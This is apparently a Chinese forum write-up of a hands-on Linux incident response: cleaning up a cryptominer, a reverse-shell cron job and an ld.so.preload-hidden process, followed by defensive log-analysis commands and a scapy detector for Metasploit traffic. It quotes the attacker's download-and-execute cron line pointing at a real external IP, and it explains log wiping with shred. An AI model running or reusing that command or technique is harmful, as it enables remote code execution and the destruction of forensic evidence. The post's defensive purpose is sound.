实战Linux应急响应踩坑与深度反思
==================

写在前面
----

随着近几年安全行业的兴起，攻击者的攻击手法也大不相同，在不经意间自己的服务器就给别人攻击了，面对这些情况我们如何做出处理显得至关重要，在应急响应的过程中我们遇到的情况可能，有的时候可能踩坑，对每一次应急响应做出反思，那么在以后的工作中就可能少踩坑，效率也会提高，下面将介绍一次对自己服务器应急踩坑事件、进行深刻反思并扩展知识，请勿喷我的低级错误。

挖矿应急响应分析
--------

突然手机收到一条短信，直接给我搞蒙了，我的服务器给日了？心里有点慌，马上登录服务器查看。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-e130dfc92430523c87581ec33139403840184c09.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-e130dfc92430523c87581ec33139403840184c09.png)

登录服务器首先做的就是将自己的重要东西备份了一波。然后查看一下自己的CPU既然是100%，肯定是遭到攻击了，猜想可能是挖矿。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cacd6f4137676249d52fd15bf793629d084e02f8.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cacd6f4137676249d52fd15bf793629d084e02f8.png)

查看网络连接状态，怎么有这么多IP

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-efe23b365f107730d57b2d56b58cd2384d195d8f.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-efe23b365f107730d57b2d56b58cd2384d195d8f.png)

首先来解释一下每个IP的意思吧  
**正常IP**  
100.100.30.26的IP是阿里云盾的IP  
117.26.48.99是自己连接阿里云的IP，看一下连接的是阿里云的22端口就知道（或者直接百度）

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-72f1f5025a1bd2929c4ca16a8010ae0c7888d314.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-72f1f5025a1bd2929c4ca16a8010ae0c7888d314.png)

117.26.48.99、91.215.169.111、100.100.0.5这些都为保留IP  
**不正常IP**  
45.89.230.240、193.33.87.219这两个IP都为国外的IP，该IP非常可疑  
先在威胁情报中心搜索一下异常IP吧

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ed640c9720a7e5e468916a834176df1e25aaf31b.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ed640c9720a7e5e468916a834176df1e25aaf31b.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-65dd6ab4ea462cbeb6d13b9ef9a016e92e283c1b.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-65dd6ab4ea462cbeb6d13b9ef9a016e92e283c1b.png)

经过查询和CPU的利用率可以确定就是挖矿

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-2f221b4180cfce1cadec0ccdb0c9f0d66d4879f3.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-2f221b4180cfce1cadec0ccdb0c9f0d66d4879f3.png)

**威胁情报常见平台（根据域名、ip、文件定性）**  
奇安信威胁情报中心  
<https://ti.qianxin.com/>  
深信服威胁情报中⼼  
<https://sec.sangfor.com.cn/analysis-platform>  
微步在线  
<https://x.threatbook.cn/>  
venuseye  
<https://www.venuseye.com.cn/>  
安恒威胁情报中⼼  
<https://ti.dbappsecurity.com.cn/>  
360威胁情报中⼼  
<https://ti.360.cn/#/homepage>  
绿盟威胁情报中⼼  
<https://ti.nsfocus.com/>  
AlienVault  
<https://otx.alienvault.com/>  
RedQueen安全智能服务平台  
<https://redqueen.tj-un.com/IntelHome.html>  
IBM X-Force Exchange  
<https://exchange.xforce.ibmcloud.com/>  
ThreatMiner  
<https://www.threatminer.org/>  
Virustotal  
<https://www.virustotal.com/gui/home/upload>

搜索上面威胁情报和进程中的关键词，发现两个进程都存在，直接使用kill关闭进程

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c8d9225a5c4ba75864874300439e732f20df8ffc.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c8d9225a5c4ba75864874300439e732f20df8ffc.png)

再次查看网络连接情况，发现像外连接的IP消失了

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-62ea56c97467daa26591ec7f93b8ec3db0311cd0.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-62ea56c97467daa26591ec7f93b8ec3db0311cd0.png)

查看CPU的情况此时恢复正常，太高兴了

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b02bea0e7d33c5f455511aeee6f2a54b25896b95.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b02bea0e7d33c5f455511aeee6f2a54b25896b95.png)

接下来的操作就是寻找文件进行删除，使用find搜索文件，进行删除，还有那个/tmp挖矿文件也删除，这大概不需要多讲吧

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-61f0f7984f3578e375323da9e349ee655c2d5fbc.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-61f0f7984f3578e375323da9e349ee655c2d5fbc.png)

应急处理完毕，但此时我需要思考的是到底是通过什么手段来上传至我的服务器的，首先排查的是否是通过爆破进来的，使用命令查看果真是  
可通过grep命令查找文件里符合条件的字符串，定位有多少IP在爆破主机的 root 帐号：

```php
grep "Failed password for root" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | more
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-032a70df79cb3c37cf0f89a784c8dbb1b49ad108.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-032a70df79cb3c37cf0f89a784c8dbb1b49ad108.png)

查看Ubuntu下/var/log/auth.log的日志发现存在大量的爆破记录

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-05c77e8fe960059d659d3f435e19e8a3e9bf8c66.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-05c77e8fe960059d659d3f435e19e8a3e9bf8c66.png)

使⽤lastb 来查看异常登录⽇志,发现有在28号的时候有人登录了，那段时间我并未登录，后面马上更改了自己的密码，并且翻了翻文件没有发现啥异常，问题解决了就没有去想了，去玩了。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-89912f680557723e0674fcb789e8ba09d69305dc.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-89912f680557723e0674fcb789e8ba09d69305dc.png)

第二天的时候我还是有点不放心，请原谅我的担忧，于是像师傅请教了一下有没有可以自动检测分析linux的工具。师傅介绍了一个GScan  
**下载地址：**<https://github.com/grayddq/GScan>  
全自动检测工具，由于忘记截图了，所以只能截取日志中保存的结果，发现没有居然存在反弹shell，有点慌了，不过处理方案已经给我们（这是多么一个致命的错误，既然别人一直在反弹shell，第二天才发现，要是是顾客估计被骂德不要不要的）

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f9b0cf2bb72b0ba830ffaa7e1f7f75992abb7e86.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f9b0cf2bb72b0ba830ffaa7e1f7f75992abb7e86.png)

`wget -q -O - http://185.191.32.198/unk.sh | sh`把下载的内容输出到标准输出，但并不在屏幕显示，目的当然是直接传递给bash进行解析执行了  
`>/dev/null`  
这条命令的作用是将标准输出1重定向到/dev/null中。 /dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了&gt;/dev/null之后，标准输出就会不再存在，没有任何地方能够找到输出的内容。  
`2>&1`  
这条命令用到了重定向绑定，采用&amp;可以将两个输出绑定在一起。这条命令的作用是错误输出将和标准输出同用一个文件描述符，说人话就是错误输出将会和标准输出输出到同一个地方。  
马上寻找该文件，并且将任务删除

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-7cecf44448b0ee5969c61eab62f23caf46a9d42e.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-7cecf44448b0ee5969c61eab62f23caf46a9d42e.png)

参考网上的资料查看了一下/etc/crontab文件中的内容，并未发现异常

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-da7c943f1d9de35b910ddef076d171620ebf717c.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-da7c943f1d9de35b910ddef076d171620ebf717c.png)

使用GScan再次扫描，发现风险清除了，这里要注意风险2并非是攻击者造成的，而是我通过xshell连接的就会检测到

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a0ed6c2797bba10248d32c9e985ac497740b44b3.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a0ed6c2797bba10248d32c9e985ac497740b44b3.png)

好比我打开两个终端那么它会检测出两个

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-293dd01286356203373e8912f161f8e281bb9e5d.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-293dd01286356203373e8912f161f8e281bb9e5d.png)

在history中发现执行的命令

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-18c7734eb12e77bb3bc811359aa11a7335931edc.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-18c7734eb12e77bb3bc811359aa11a7335931edc.png)

后面我也去查看了syslog日志信息，发现没有清除的时候一直都在请求下载，清除后没有进行下载了，这时的我变得更加细心，将所有日志大概翻了一遍，并且认真的观察了进程以及第三方应用，没有再发现问题，此时的应急响应结束。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f8908ddd7332f57bcedb59ced6546b5f2d363bb3.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f8908ddd7332f57bcedb59ced6546b5f2d363bb3.png)

终于算是清理完成了，来理清一下思路和反思一下自己这次的不足吧，当然并不像上面的那么顺利，其中也遇到了很多问题

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ef72c0654433ca7cb3d77fef225e92ab3f26db73.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ef72c0654433ca7cb3d77fef225e92ab3f26db73.png)

隐藏进程应急响应
--------

首先状况是出现了系统卡顿，不知道怎么回事，查看了自己的CPU并未发现异常

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ddb5a4c8aaf31277a74f03b644b4466a0a6d8467.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ddb5a4c8aaf31277a74f03b644b4466a0a6d8467.png)

查看网络连接发现存在外网的网络连接

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-537720f157fc5ea0f1390f4e59c9d4c4ee9c1d27.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-537720f157fc5ea0f1390f4e59c9d4c4ee9c1d27.png)

查看是否有异常进程并未发现有异常进程，思考的问题来了为什么会有外网连接的ip

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ac18e61147044af59bf5c582a6d5507f6bb7015b.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ac18e61147044af59bf5c582a6d5507f6bb7015b.png)

查看任务并未发现定时任务

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-259c6f54a2fb1315a69ad9c27946efb6c7152d2f.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-259c6f54a2fb1315a69ad9c27946efb6c7152d2f.png)

在/etc下面的目录查找最近12小时被修改的文件，在这里第一开始的时候是在~目录下查找，由于文件太多不易分辨，所以就依次在一些常用的系统目录进行查找

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-32c174339dd13b5bf12d13b45485cfd67b04d1b4.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-32c174339dd13b5bf12d13b45485cfd67b04d1b4.png)

/etc/ld.so.preload 文件的变更需要引起注意，这里涉及到 Linux 动态链接库预加载机制，是一种常用的进程隐藏方法，而 top 等命令都是受这个机制影响的。在 Linux 操作系统的动态链接库加载过程中，动态链接器会读取 LD\_PRELOAD 环境变量的值和默认配置文件 /etc/ld.so.preload 的文件内容，并将读取到的动态链接库进行预加载，即使程序不依赖这些动态链接库，LD\_PRELOAD 环境变量和 /etc/ld.so.preload 配置文件中指定的动态链接库依然会被装载，它们的优先级比 LD\_LIBRARY\_PATH 环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。  
查看该文件的内容有文件被加载

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-3611237a4e46b482cb8003cf9003d8e5c809613d.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-3611237a4e46b482cb8003cf9003d8e5c809613d.png)

删除文件中的内容后，发现存在一个进程CPU利用率达到90%以上

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-fd6bdf5c246bc61497af79dfeb20641be661f841.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-fd6bdf5c246bc61497af79dfeb20641be661f841.png)

先kill掉进程，此时恢复正常，并且也没有向外请求数据

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f66570108b5aec2f5119a7b604fe8b5cfe301151.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f66570108b5aec2f5119a7b604fe8b5cfe301151.png)

直接找到该文件删除（其实这里可以查看备份一下该文件进行分析，但由于是二进制的内容不怎么会分析）

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c1af86375cd2faa3db16f612011cbe9ce8e768f1.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c1af86375cd2faa3db16f612011cbe9ce8e768f1.png)

寻找index.py文件进行删除

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-27141df6dbdb576bbea22f91447b0471f9deb3ec.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-27141df6dbdb576bbea22f91447b0471f9deb3ec.png)

再使用GScan扫描一下

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-35f310604f89d46d2d2cbeede61d9ccd514d9411.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-35f310604f89d46d2d2cbeede61d9ccd514d9411.png)

此时问题已经解决，需要做的就是分析入侵的手段了  
history查看历史命名并没有获取到很多有用的东西，应该是给清除了。  
查看日志文件，怎么一大串都是乱码，此时很疑惑，我的知识盲区（留下了没技术的眼泪）  
通过大量的资料查询了解到往往攻击者删除的文件可以通过一些手段进行恢复，攻击者更好、更安全的解决方案是分解日志文件。但是假设有一种方法可以删除文件并多次擦写覆盖它，这使得恢复变得更加困难。Linux有一个内置命令，名为shred，正是为了这个目的。就其本身而言，shred将删除文件并多次覆盖它——默认情况下，shred将覆盖4次。通常，文件被覆盖的次数越多，恢复起来就越困难，但是请记住，每次覆盖都需要时间，因此对于非常大的文件，碎片化可能会很耗时。主要包括两个有用的选项，一个是-f选项，它更改文件的权限，以便在需要更改权限时允许覆盖；另一个是-n选项，它允许您选择覆盖文件的次数。对于被覆盖的文件的内容可以对我们毫无用处，并且想要恢复这些数据是及其困难的。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a71b83776414efc45d031ee9bc5f6e13f5d069b1.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a71b83776414efc45d031ee9bc5f6e13f5d069b1.png)

查看了日志状态，日志都给关闭了，可以这样子说想要溯源几乎是非常困难的。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-d40dc4964c5407e7c194a0b86d5387c22f897329.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-d40dc4964c5407e7c194a0b86d5387c22f897329.png)

知识扩展
----

在经历这次的linux应急响应让我学到了很多东西，其中也包括攻击思路。查询了很多资料，现在将这些资料以及思路扩充。

### 极端条件

面对上面的极端的情形（无法溯源）我们能做什么呢？当然是提高自己的防御措施呀，发现系统的漏洞。对于一个应急人员想要全面的向管理人员进行询问有哪些应用是一件很难的事。所以这里推荐使用自动化脚本能够将linux系统中的服务、以及一些漏洞进行全面的扫描，节省了我们大量的时间，有可能攻击者并未通过该漏洞进行攻击，在上交报告的时候也更多东西可以写，让顾客更加满意。其实这也就是从一个攻击者去思考的问题，这里推荐LinEnum直接运行即可。  
下载地址：<https://github.com/rebootuser/LinEnum>

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-5b8a27a4a5b4f51ec263e19dd02c2f003187addf.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-5b8a27a4a5b4f51ec263e19dd02c2f003187addf.png)

### 进程分析

在最初的挖矿病毒中我依次清除了两个进程，要是进程非常多，这里有没有一种简单的方法将它全部清除。上面我并未分析是否有父子进程的关系，因为当时的知识有限，有的时候⼀个⽊⻢或者后⻔如果主进程还存在⼦进程，仅仅杀死主进程可能是没⽤的，因为不会杀死⼦进程。有的是写脚本，有的是⼿动挨个杀，⽤killall、pkill等等，但是在遇到那种进程 pid，进程名称⼀直变化的又该怎么办呢？将下面文件保存为到以C为后缀的文件中。  
编译fach.c`gcc fach.c -o fach`运行fach即可

```c
#include <unistd.h>
#include <stdio.h>
int main()
{
    setbuf(stdout, NULL);
    pid_t pid;
    pid = fork();
    if(pid == 0){
        printf("child pid: %d\n", getpid());
        while(1){
            sleep(1);
            printf("child\n");
        }
    } else {
        printf("father pid %d\n", getpid());
        while(1){
            sleep(1);
            printf("father\n");
        }
    }
}
```

此时我kill掉了父进程，不再打印father，可是子进程还在打印说明并未将它删除，kill - 9 表示强制杀死该进程。如果我想把这些⽊⻢病毒进程都⼲掉，怎么操作？这里直接kill掉进程组  
`kill -9 -PGID`  
这⾥⼀定要注意，你杀的是⼀个进程组，⼀定要注意，进程组⾥是否有正常业务进程，别杀错了，可以依次尝试加深印象。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-9df4c8183d9bb5f483047f114a9fa168c685e3ed.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-9df4c8183d9bb5f483047f114a9fa168c685e3ed.png)

### 防止爆破

现在很多攻击者都是通过爆破进去，提出以下方案：  
1.将密码设置复杂，不定期更换密码  
2.更改端口号  
3.禁止root用户登陆  
4.使用fail2ban防止暴力破解  
具体使用请参考：  
<https://www.cnblogs.com/operationhome/p/9184580.html>

### 勒索病毒

判读勒索病毒其实很简单根据勒索加密⽂件的后缀名、联系邮箱，一般都会提示你。这里不做过多的演示（不好展开来讲），不过可以自己通过GitHub等去查找。  
根据勒索病毒类型寻找解决⽅法  
深信服千⾥⽬实验室公众号直接回复病毒关键字 安全响应及EDR知识赋能平台 Freebuf 淘宝、闲⻥ 、安全产商等等  
解决勒索  
有解密⼯具就⽤解密⼯具 ⽆解密⼯具就交钱  
所以说面对勒索病毒真的挺难解决的，最好的办法就是防御，不然几乎一中勒索病毒就要花费大量的财力。

### 熟悉常用命令

常用的一些命令以及参数要熟练的使用（配合使用也要会）

```php
ls、grep、find、locate、top、history、more、crontab、rm、用户的增删改查等等
以下命令是多种命令相互结合实现了其他功能
可通过grep命令查找文件里符合条件的字符串，定位有多少IP在爆破主机的 root 帐号（文件的位置根据不同系统定义）：
grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more
定位有哪些 IP 在爆破：
grep "Failed password" /var/log/secure|grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"|uniq -c
爆破用户名字典是什么？
grep "Failed password" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr
登录成功的 IP 有哪些：
grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more
输出登录爆破的第一行和最后一行，确认爆破时间范围
grep "Failed pssword" /var/log/secure | head -1
grep "Failed pssword" /var/log/secure | tail -1
登录成功的日期、用户名、IP：
grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
增加用户
grep "useradd" /var/log/secure删除用户
grep "userdel" /var/log/secure
```

### 熟悉文件

熟悉系统日志文件、第三方服务日志文件、Linux的框架、比较重要的文件

```php
1、/var/log/boot.log（自检过程）
2、/var/log/cron （crontab守护进程crond所派生的子进程的动作）
3、/var/log/maillog （发送到系统或从系统发出的电子邮件的活动）
4、/var/log/syslog （它只记录警告信息，常常是系统出问题的信息，所以更应该关注该文件）
要让系统生成syslog日志文件，
在/etc/syslog.conf文件中加上：*.warning /var/log/syslog
该日志文件能记录当用户登录时login记录下的错误口令、Sendmail的问题、su命令执行失败等信息
5、/var/run/utmp
该日志文件需要使用lastlog命令查看
6、/var/log/wtmp
（该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件）
last命令就通过访问这个文件获得这些信息
7、/var/run/utmp
（该日志文件记录有关当前登录的每个用户的信息）
8、/var/log/xferlog
（该日志文件记录FTP会话，可以显示出用户向FTP服务器或从服务器拷贝了什么文件）
```

这里例举proc/pid/文件夹下的文件

```php
Linux在启动一个进程时，系统会在/proc下创建一个以pid命名的文件夹，在该文件夹下会有我们的进程的信息，其中包括一个名为exe的文件即记录了绝对路径，通过ll或ls –l命令即可查看。exe实际运行程序的符号链接；
cmdline 一个只读文件，包含进程的完整命令行信息；
comm 包含进程的命令名；
cwd 进程当前工作目录的符号链接；
status 进程状态信息，包含的信息多于stat；
stat 进程状态信息；
cwd 进程当前工作目录的符号链接；
latency 显示哪些代码造成的延时比较大；
environ记录了进程运行时的环境变量；
fd目录下是进程打开或使用的文件的符号连接。
```

### 文件恢复

对于一些攻击者有可能会对一些文件进行删除，作为应急人员掌握一些基本的文件恢复的技巧可以说是必须的，下面这篇文章详细介绍了很多种文件恢复的方法，请参考：  
[https://blog.csdn.net/qq\_40907977/article/details/112134618](https://blog.csdn.net/qq_40907977/article/details/112134618)

### 流量分析

流量分析在我们应急响应中也是非常重要的，流量分析主要分析流量的异常情况，熟悉各种协议传输过程中的差异很重要，下面举一个msf生成http协议的后门的例子，下列数据包，与普通流量有哪些不一样，其实很明显就能够看得出User-Agent异常。在很多攻击工具中其实都是有特征的，而防护软件正是根据这些特征来识别是否是恶意软件，在平常生活中做做有心人，将各种工具的特征收集起来，那也是相当不错的。面对这些特征能不能写一个简单的脚本进行删选出后门呢？

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-57963990e6bf612dcc30c2d0735c12e7e445e6c6.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-57963990e6bf612dcc30c2d0735c12e7e445e6c6.png)

通过python脚本根据上面的信息来实现检测，可以进行改写

```python
from scapy.all import *
def packet_callback(packet):
    data=bytes(packet[TCP].payload)
    if b'User-Agent' in data:
        for info in data.split(b'\n'):
            User_A=b'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
            if User_A in info:
                print(data.split(b'\n')[5])
                print('msf后门控制中')

if __name__ == '__main__':
    i=input('inet:')
    sniff(filter='tcp',iface=i,prn=packet_callback,store=0)
    #filter 筛选 iface 网卡,根据自己的选定 prn 调用函数  count 获取条数  store 内存清除

```

而对于一些隧道协议是非常难发现问题的比如SSH、DNS面对这些隧道协议又该怎么办呢？下面这篇文章详细介绍了对SSH隧道入侵的检测与响应的方法  
<https://www.freebuf.com/articles/system/194775.html>

### 撰写报告

对于应急人员来说，一份完美的报告是必不可少的，往往很多人能够对应急问题处理清楚，但是在写报告的时候却是跟别人的差距很大，一份报告体现了许多东西，如何写好一份报告需要我们去思考，好比同样是挖到一个洞，但是别人就是会吹，明明危害并不是很大，通过别人的报告给我们的感觉就是危害很大，这里推荐一个网站，里面有很多优秀的报告模板。  
<https://vipread.com/index>

### 如何防御

1、web网站及时修复漏洞  
2、对服务器第三方服务比如MySQL、Redis、FTP等等漏洞防护  
3、防止被社工、提高自己的安全意识，人为因素产生的比如一些密码之类的隐患要尽量避免。  
4、加强防护软件的部署、及时做好数据备份等  
5、部署监控器，当遭受攻击时第一时间通过邮箱、微信等通知你  
请参考https://www.jianshu.com/p/800c1967c7e5

总结
--

应急响应是一个不断总结的过程，通过总结应急的能力也会提升，对每一次应急响应进行反思，及时扩充知识，那么学到的东西并不比红队差，同时也可以学到一些新的攻击手法比如如何更好的隐藏自己，当今主流的攻击手段是什么，对我们还是很有帮助的。时刻提醒自己问题解决了，还会不会要其他问题，往往风平浪静的表面，背地可能波涛汹涌，别大意了。